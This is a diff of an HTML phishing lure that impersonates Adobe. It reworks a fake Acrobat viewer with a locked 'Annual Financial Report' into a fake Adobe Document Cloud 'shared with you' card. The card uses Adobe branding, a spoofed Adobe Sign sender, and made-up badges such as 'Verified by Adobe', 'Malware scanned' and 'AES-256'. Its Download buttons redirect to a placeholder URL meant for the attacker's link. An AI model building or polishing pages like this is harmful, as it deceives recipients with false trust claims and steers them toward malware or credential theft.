@@ -3,576 +3,542 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adobe Acrobat - PDF Viewer</title>
+    <title>Adobe Document Cloud — Shared with you</title>
     <link rel="icon" href="https://www.adobe.com/favicon.ico">
     <style>
-        @page { size: A4; margin: 0; }
-
         *, *::before, *::after {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        body {
-            font-family: 'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #393939;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            color: #d4d4d4;
+        html, body {
+            min-height: 100%;
         }
 
-        /* App bar */
-        .app-bar {
-            background: #1c1c20;
-            height: 48px;
+        body {
+            font-family: 'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background:
+                radial-gradient(1200px 600px at 85% -10%, rgba(235, 16, 0, 0.08), transparent 60%),
+                radial-gradient(900px 500px at -10% 110%, rgba(20, 115, 230, 0.10), transparent 55%),
+                #f5f6f8;
+            color: #1a1a1a;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ── Top bar ── */
+        .topbar {
+            height: 56px;
+            padding: 0 24px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 0 20px;
+            background: #ffffff;
+            border-bottom: 1px solid #ececec;
         }
 
-        .app-bar-left {
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .brand svg {
+            width: 24px;
+            height: 22px;
+        }
+
+        .brand-text {
+            font-size: 14px;
+            font-weight: 700;
+            color: #1a1a1a;
+            letter-spacing: -0.1px;
+        }
+
+        .brand-sub {
+            font-size: 12px;
+            color: #8a8a8a;
+            margin-left: 8px;
+            padding-left: 10px;
+            border-left: 1px solid #e5e5e5;
+        }
+
+        .top-right {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .help-link {
+            font-size: 12px;
+            color: #555;
+            text-decoration: none;
+        }
+
+        .help-link:hover {
+            color: #1473e6;
+        }
+
+        .avatar {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #4b6cb7, #182848);
+            color: #fff;
+            font-size: 11px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ── Main stage ── */
+        .stage {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px 56px;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 520px;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow:
+                0 1px 2px rgba(0, 0, 0, 0.04),
+                0 12px 40px rgba(15, 25, 50, 0.08);
+            overflow: hidden;
+            animation: cardIn 0.45s cubic-bezier(0.2, 0.7, 0.2, 1) both;
+        }
+
+        @keyframes cardIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Sender header */
+        .sender {
+            padding: 22px 24px 18px;
             display: flex;
             align-items: center;
             gap: 12px;
+            border-bottom: 1px solid #f0f1f3;
         }
 
-        .app-bar-left svg {
-            width: 22px;
-            height: 18px;
-        }
-
-        .app-bar-left span {
-            font-size: 14px;
-            font-weight: 600;
-            color: #fff;
-        }
-
-        .bar-sep {
-            width: 1px;
-            height: 18px;
-            background: #444;
-        }
-
-        .bar-nav {
-            display: flex;
-            gap: 2px;
-        }
-
-        .bar-nav a {
-            font-size: 12px;
-            color: #aaa;
-            text-decoration: none;
-            padding: 5px 12px;
-            border-radius: 5px;
-            font-weight: 500;
-        }
-
-        .bar-nav a:hover {
-            color: #fff;
-            background: rgba(255,255,255,0.06);
-        }
-
-        .bar-nav a.active {
-            color: #fff;
-            background: rgba(255,255,255,0.1);
-        }
-
-        .app-bar-right {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .bar-icon {
-            width: 30px;
-            height: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 5px;
-            background: none;
-            border: none;
-            color: #999;
-            cursor: pointer;
-        }
-
-        .bar-icon:hover {
-            color: #fff;
-            background: rgba(255,255,255,0.06);
-        }
-
-        .bar-icon svg {
-            width: 16px;
-            height: 16px;
-        }
-
-        .bar-avatar {
-            width: 26px;
-            height: 26px;
+        .sender-avatar {
+            width: 40px;
+            height: 40px;
             border-radius: 50%;
-            background: #4b6cb7;
+            background: linear-gradient(135deg, #eb1000, #b30000);
             color: #fff;
-            font-size: 10px;
-            font-weight: 600;
+            font-size: 14px;
+            font-weight: 700;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-left: 6px;
+            flex-shrink: 0;
         }
 
-        /* Toolbar */
-        .toolbar {
-            background: #28282c;
-            height: 42px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 16px;
-            border-bottom: 1px solid #3a3a3a;
-        }
-
-        .tb-filename {
-            font-size: 13px;
-            color: #c0c0c0;
-            font-weight: 500;
-        }
-
-        .tb-center {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .pg-btn {
-            width: 26px;
-            height: 26px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: none;
-            border: none;
-            color: #888;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-
-        .pg-btn:hover {
-            color: #fff;
-            background: rgba(255,255,255,0.06);
-        }
-
-        .pg-btn svg {
-            width: 14px;
-            height: 14px;
-        }
-
-        .pg-input {
-            width: 36px;
-            height: 24px;
-            background: #1a1a1d;
-            border: 1px solid #444;
-            border-radius: 3px;
-            color: #ddd;
-            text-align: center;
-            font-size: 11px;
-        }
-
-        .pg-total {
-            font-size: 11px;
-            color: #888;
-        }
-
-        .zoom-area {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            margin-left: 12px;
-            padding-left: 12px;
-            border-left: 1px solid #3a3a3a;
-        }
-
-        .zoom-val {
-            font-size: 11px;
-            color: #888;
-            min-width: 36px;
-            text-align: center;
-        }
-
-        .tb-right {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .tb-btn {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            background: none;
-            border: none;
-            color: #999;
-            font-size: 11px;
-            font-weight: 500;
-            padding: 5px 10px;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        .tb-btn:hover {
-            color: #fff;
-            background: rgba(255,255,255,0.06);
-        }
-
-        .tb-btn svg {
-            width: 14px;
-            height: 14px;
-        }
-
-        .tb-btn.accent {
-            background: #1473e6;
-            color: #fff;
-        }
-
-        .tb-btn.accent:hover {
-            background: #0d66d0;
-        }
-
-        /* Viewer */
-        .viewer {
+        .sender-info {
+            min-width: 0;
             flex: 1;
+        }
+
+        .sender-line {
+            font-size: 13px;
+            color: #1a1a1a;
+            line-height: 1.4;
+        }
+
+        .sender-line strong {
+            font-weight: 600;
+        }
+
+        .sender-meta {
+            font-size: 12px;
+            color: #888;
+            margin-top: 2px;
+        }
+
+        .sender-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            font-size: 11px;
+            font-weight: 600;
+            color: #1473e6;
+            background: rgba(20, 115, 230, 0.08);
+            padding: 4px 8px;
+            border-radius: 999px;
+            flex-shrink: 0;
+        }
+
+        .sender-badge svg {
+            width: 11px;
+            height: 11px;
+        }
+
+        /* Document card */
+        .doc {
+            padding: 24px;
+        }
+
+        .doc-tile {
             display: flex;
+            gap: 16px;
+            align-items: flex-start;
+            padding: 18px;
+            border: 1px solid #ececec;
+            border-radius: 12px;
+            background: #fafbfc;
+        }
+
+        .doc-thumb {
+            width: 64px;
+            height: 80px;
+            background: #fff;
+            border-radius: 6px;
+            border: 1px solid #e5e5e5;
+            position: relative;
+            flex-shrink: 0;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04);
             overflow: hidden;
         }
 
-        /* Thumbnails */
-        .thumbs {
-            width: 160px;
-            background: #28282c;
-            border-right: 1px solid #3a3a3a;
-            overflow-y: auto;
-            padding: 12px;
+        .doc-thumb::before {
+            content: '';
+            position: absolute;
+            top: 0; right: 0;
+            width: 16px; height: 16px;
+            background: linear-gradient(225deg, #ececec 50%, transparent 50%);
+        }
+
+        .doc-thumb-lines {
+            padding: 10px 8px;
+        }
+
+        .doc-thumb-lines span {
+            display: block;
+            height: 2px;
+            background: #d8dadd;
+            border-radius: 1px;
+            margin-bottom: 3px;
+        }
+
+        .doc-thumb-lines span:nth-child(1) { width: 70%; background: #b9bcc1; height: 3px; margin-bottom: 5px; }
+        .doc-thumb-lines span:nth-child(2) { width: 95%; }
+        .doc-thumb-lines span:nth-child(3) { width: 88%; }
+        .doc-thumb-lines span:nth-child(4) { width: 92%; }
+        .doc-thumb-lines span:nth-child(5) { width: 80%; }
+        .doc-thumb-lines span:nth-child(6) { width: 90%; }
+
+        .doc-pdf-tag {
+            position: absolute;
+            bottom: 6px;
+            left: 6px;
+            font-size: 7px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            color: #fff;
+            background: #eb1000;
+            padding: 2px 4px;
+            border-radius: 2px;
+        }
+
+        .doc-info {
+            min-width: 0;
+            flex: 1;
+        }
+
+        .doc-name {
+            font-size: 15px;
+            font-weight: 600;
+            color: #1a1a1a;
+            line-height: 1.35;
+            word-break: break-word;
+            margin-bottom: 6px;
+        }
+
+        .doc-meta {
+            font-size: 12px;
+            color: #6b7280;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px 10px;
+        }
+
+        .doc-meta span {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .doc-meta .dot {
+            width: 3px;
+            height: 3px;
+            border-radius: 50%;
+            background: #c8ccd1;
+            display: inline-block;
+        }
+
+        /* Action */
+        .actions {
+            margin-top: 20px;
             display: flex;
             flex-direction: column;
             gap: 10px;
         }
 
-        .thumb {
-            background: #fff;
-            border-radius: 3px;
-            padding: 8px 6px;
-            cursor: pointer;
-            border: 2px solid transparent;
-        }
-
-        .thumb:hover {
-            border-color: #555;
-        }
-
-        .thumb.active {
-            border-color: #1473e6;
-        }
-
-        .tl {
-            height: 3px;
-            background: #ddd;
-            border-radius: 2px;
-            margin-bottom: 4px;
-        }
-
-        .tl.head {
-            width: 40%;
-            height: 5px;
-            background: #bbb;
-            margin-bottom: 6px;
-        }
-
-        .tl.w90 { width: 90%; }
-        .tl.w85 { width: 85%; }
-        .tl.w80 { width: 80%; }
-        .tl.w95 { width: 95%; }
-        .tl.w70 { width: 70%; }
-
-        .thumb-num {
-            text-align: center;
-            font-size: 8px;
-            color: #888;
-            margin-top: 4px;
-        }
-
-        /* Canvas */
-        .canvas {
-            flex: 1;
-            overflow: auto;
-            display: flex;
-            justify-content: center;
-            padding: 28px 20px;
-            background: #444;
-        }
-
-        .page {
-            background: #fff;
-            width: 640px;
-            min-height: 840px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.35);
-            border-radius: 2px;
-            position: relative;
-            flex-shrink: 0;
-        }
-
-        .page-inner {
-            padding: 48px 44px;
-            color: #222;
-        }
-
-        .page-inner h1 {
-            font-size: 22px;
-            font-weight: 700;
-            color: #111;
-            margin-bottom: 6px;
-        }
-
-        .page-inner .subtitle {
-            font-size: 13px;
-            color: #777;
-            margin-bottom: 24px;
-            padding-bottom: 14px;
-            border-bottom: 1px solid #eee;
-        }
-
-        .page-inner h2 {
-            font-size: 15px;
-            font-weight: 700;
-            color: #222;
-            margin-top: 24px;
-            margin-bottom: 10px;
-        }
-
-        .page-inner p {
-            font-size: 12px;
-            line-height: 1.75;
-            color: #444;
-            margin-bottom: 12px;
-        }
-
-        /* Lock gradient */
-        .lock-grad {
-            position: absolute;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            height: 55%;
-            background: linear-gradient(to bottom, rgba(255,255,255,0) 0%, rgba(255,255,255,0.92) 40%, rgba(255,255,255,0.99) 100%);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-end;
-            padding-bottom: 70px;
-        }
-
-        .lock-circle {
-            width: 48px;
-            height: 48px;
-            background: #1473e6;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 14px;
-        }
-
-        .lock-circle svg {
-            width: 22px;
-            height: 22px;
-            fill: #fff;
-        }
-
-        .lock-grad h3 {
-            font-size: 16px;
-            font-weight: 600;
-            color: #222;
-            margin-bottom: 6px;
-        }
-
-        .lock-grad p {
-            font-size: 13px;
-            color: #777;
-            margin-bottom: 16px;
-            text-align: center;
-            max-width: 280px;
-        }
-
-        .dl-btn {
+        .btn-primary {
+            width: 100%;
             display: inline-flex;
             align-items: center;
+            justify-content: center;
             gap: 8px;
             background: #1473e6;
             color: #fff;
             border: none;
-            border-radius: 20px;
-            padding: 12px 28px;
+            border-radius: 10px;
+            padding: 14px 20px;
             font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: background 0.15s ease, transform 0.05s ease;
+            font-family: inherit;
         }
 
-        .dl-btn:hover {
-            background: #0d66d0;
-        }
+        .btn-primary:hover { background: #0d66d0; }
+        .btn-primary:active { transform: translateY(1px); }
 
-        .dl-btn svg {
+        .btn-primary svg {
             width: 16px;
             height: 16px;
         }
 
-        /* Status bar */
-        .status-bar {
-            background: #1c1c20;
-            padding: 6px 20px;
-            display: flex;
+        .btn-secondary {
+            width: 100%;
+            display: inline-flex;
             align-items: center;
-            justify-content: space-between;
-            font-size: 10px;
-            color: #666;
+            justify-content: center;
+            gap: 8px;
+            background: #ffffff;
+            color: #444;
+            border: 1px solid #d8dadd;
+            border-radius: 10px;
+            padding: 12px 18px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            font-family: inherit;
         }
 
-        @media print {
-            body { background: #fff; }
-            .app-bar, .toolbar, .thumbs, .status-bar, .lock-grad { display: none; }
-            .viewer { display: block; }
-            .canvas { padding: 0; background: #fff; }
-            .page { box-shadow: none; width: 100%; }
+        .btn-secondary:hover {
+            border-color: #b9bcc1;
+            color: #1a1a1a;
+        }
+
+        /* Verification strip */
+        .verify {
+            margin-top: 18px;
+            padding: 14px 16px;
+            background: #f6f8fb;
+            border: 1px solid #eef0f3;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .verify-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #e7f1fd;
+            color: #1473e6;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .verify-icon svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .verify-text {
+            font-size: 12px;
+            color: #4a4f57;
+            line-height: 1.5;
+        }
+
+        .verify-text strong {
+            color: #1a1a1a;
+            font-weight: 600;
+        }
+
+        /* Trust row */
+        .trust {
+            margin-top: 16px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 14px;
+            justify-content: center;
+            padding: 0 4px;
+        }
+
+        .trust-item {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            color: #6b7280;
+        }
+
+        .trust-item svg {
+            width: 12px;
+            height: 12px;
+            fill: #1473e6;
+        }
+
+        /* Expiration */
+        .expires {
+            margin-top: 14px;
+            text-align: center;
+            font-size: 11px;
+            color: #8a8a8a;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            font-size: 11px;
+            color: #8a8a8a;
+            padding: 18px 20px 24px;
+        }
+
+        .footer a {
+            color: #6b7280;
+            text-decoration: none;
+            margin: 0 4px;
+        }
+
+        .footer a:hover {
+            color: #1473e6;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .topbar { padding: 0 16px; }
+            .brand-sub { display: none; }
+            .stage { padding: 24px 14px 40px; }
+            .card { border-radius: 14px; }
+            .sender { padding: 18px 18px 14px; }
+            .doc { padding: 18px; }
+            .doc-tile { padding: 14px; gap: 12px; }
+            .doc-thumb { width: 56px; height: 72px; }
+            .doc-name { font-size: 14px; }
         }
     </style>
 </head>
 <body>
-    <header class="app-bar">
-        <div class="app-bar-left">
-            <svg viewBox="0 0 30 26" fill="none">
+    <header class="topbar">
+        <div class="brand">
+            <svg viewBox="0 0 30 26" fill="none" aria-hidden="true">
                 <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
                 <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
                 <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
             </svg>
-            <span>Acrobat</span>
-            <div class="bar-sep"></div>
-            <nav class="bar-nav">
-                <a href="#">Home</a>
-                <a href="#" class="active">Documents</a>
-                <a href="#">Tools</a>
-            </nav>
+            <span class="brand-text">Adobe Document Cloud</span>
+            <span class="brand-sub">Secure share</span>
         </div>
-        <div class="app-bar-right">
-            <button class="bar-icon" title="Notifications">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 006 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 01-3.46 0"/></svg>
-            </button>
-            <button class="bar-icon" title="Help">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
-            </button>
-            <div class="bar-avatar">JD</div>
+        <div class="top-right">
+            <a class="help-link" href="#">Help</a>
+            <div class="avatar" title="You">JD</div>
         </div>
     </header>
 
-    <div class="toolbar">
-        <span class="tb-filename">Annual_Report_2026.pdf</span>
-        <div class="tb-center">
-            <button class="pg-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg></button>
-            <input type="text" class="pg-input" value="1" readonly>
-            <span class="pg-total">/ 24</span>
-            <button class="pg-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg></button>
-            <div class="zoom-area">
-                <button class="pg-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
-                <span class="zoom-val">100%</span>
-                <button class="pg-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
+    <main class="stage">
+        <section class="card" role="region" aria-label="Shared document">
+            <div class="sender">
+                <div class="sender-avatar" aria-hidden="true">A</div>
+                <div class="sender-info">
+                    <div class="sender-line"><strong>Adobe Sign</strong> shared a document with you</div>
+                    <div class="sender-meta">noreply@adobesign.com &middot; just now</div>
+                </div>
+                <span class="sender-badge" title="End-to-end encrypted">
+                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/></svg>
+                    Encrypted
+                </span>
             </div>
-        </div>
-        <div class="tb-right">
-            <button class="tb-btn">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
-                Share
-            </button>
-            <button class="tb-btn accent" onclick="window.location.href='REDIRECT_URL_HERE'">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-                Download
-            </button>
-        </div>
-    </div>
 
-    <main class="viewer">
-        <aside class="thumbs">
-            <div class="thumb active">
-                <div class="tl head"></div>
-                <div class="tl w95"></div>
-                <div class="tl w90"></div>
-                <div class="tl w85"></div>
-                <div class="tl w95"></div>
-                <div class="tl w80"></div>
-                <div class="thumb-num">1</div>
-            </div>
-            <div class="thumb">
-                <div class="tl head" style="width:30%"></div>
-                <div class="tl w90"></div>
-                <div class="tl w95"></div>
-                <div class="tl w85"></div>
-                <div class="tl w90"></div>
-                <div class="tl w70"></div>
-                <div class="thumb-num">2</div>
-            </div>
-            <div class="thumb">
-                <div class="tl w95"></div>
-                <div class="tl w85"></div>
-                <div class="tl w90"></div>
-                <div class="tl w95"></div>
-                <div class="tl w80"></div>
-                <div class="tl w85"></div>
-                <div class="thumb-num">3</div>
-            </div>
-            <div class="thumb">
-                <div class="tl head"></div>
-                <div class="tl w90"></div>
-                <div class="tl w85"></div>
-                <div class="tl w95"></div>
-                <div class="tl w70"></div>
-                <div class="tl w85"></div>
-                <div class="thumb-num">4</div>
-            </div>
-        </aside>
-
-        <section class="canvas">
-            <article class="page">
-                <div class="page-inner">
-                    <h1>Annual Financial Report</h1>
-                    <p class="subtitle">Fiscal Year 2026 &mdash; Confidential</p>
-
-                    <h2>1. Executive Summary</h2>
-                    <p>This report provides stakeholders with a detailed analysis of our financial performance throughout fiscal year 2026. Strategic initiatives have yielded significant growth across all major business segments.</p>
-                    <p>Revenue increased by 18.7% year-over-year, driven by expansion in emerging markets and successful product launches. Operating margins improved to 24.3%, reflecting continued focus on operational efficiency.</p>
-
-                    <h2>2. Revenue Analysis</h2>
-                    <p>Total consolidated revenue reached $4.82 billion for the fiscal year, exceeding analyst expectations by 6.2%. Breakdown by segment:</p>
-                    <p>&bull; Enterprise Solutions: $2.14B (+22.1% YoY)<br>&bull; Cloud Services: $1.68B (+31.4% YoY)<br>&bull; Professional Services: $0.72B (+8.3% YoY)<br>&bull; Licensing: $0.28B (+4.6% YoY)</p>
+            <div class="doc">
+                <div class="doc-tile">
+                    <div class="doc-thumb" aria-hidden="true">
+                        <div class="doc-thumb-lines">
+                            <span></span><span></span><span></span>
+                            <span></span><span></span><span></span>
+                        </div>
+                        <span class="doc-pdf-tag">PDF</span>
+                    </div>
+                    <div class="doc-info">
+                        <div class="doc-name">Annual_Report_2026.pdf</div>
+                        <div class="doc-meta">
+                            <span>5.8&nbsp;MB</span>
+                            <span class="dot"></span>
+                            <span>24 pages</span>
+                            <span class="dot"></span>
+                            <span>Adobe&nbsp;PDF</span>
+                        </div>
+                    </div>
                 </div>
 
-                <div class="lock-grad">
-                    <div class="lock-circle">
-                        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/></svg>
-                    </div>
-                    <h3>Download to continue reading</h3>
-                    <p>This document is protected. Download the full PDF to access all 24 pages.</p>
-                    <button class="dl-btn" onclick="window.location.href='REDIRECT_URL_HERE'">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-                        Download PDF
+                <div class="actions">
+                    <button class="btn-primary" type="button" onclick="window.location.href='REDIRECT_URL_HERE'">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                        Download document
                     </button>
                 </div>
-            </article>
+
+                <div class="verify" role="note">
+                    <div class="verify-icon" aria-hidden="true">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/><polyline points="9 12 11 14 15 10"/></svg>
+                    </div>
+                    <div class="verify-text">
+                        <strong>Verified by Adobe.</strong> This file has been scanned and digitally signed. Only the recipient can access the contents.
+                    </div>
+                </div>
+
+                <div class="trust" aria-label="Security details">
+                    <div class="trust-item">
+                        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+                        TLS 1.3
+                    </div>
+                    <div class="trust-item">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                        Malware scanned
+                    </div>
+                    <div class="trust-item">
+                        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
+                        AES-256
+                    </div>
+                </div>
+
+                <div class="expires">Link expires in 7 days &middot; Single recipient</div>
+            </div>
         </section>
     </main>
 
-    <footer class="status-bar">
-        <span>Annual_Report_2026.pdf &mdash; 5.8 MB</span>
-        <span>Last modified: Apr 14, 2026</span>
+    <footer class="footer">
+        &copy; 2026 Adobe. All rights reserved. &middot;
+        <a href="#">Privacy</a> &middot;
+        <a href="#">Terms of Use</a> &middot;
+        <a href="#">Cookie preferences</a>
     </footer>
 </body>
 </html>
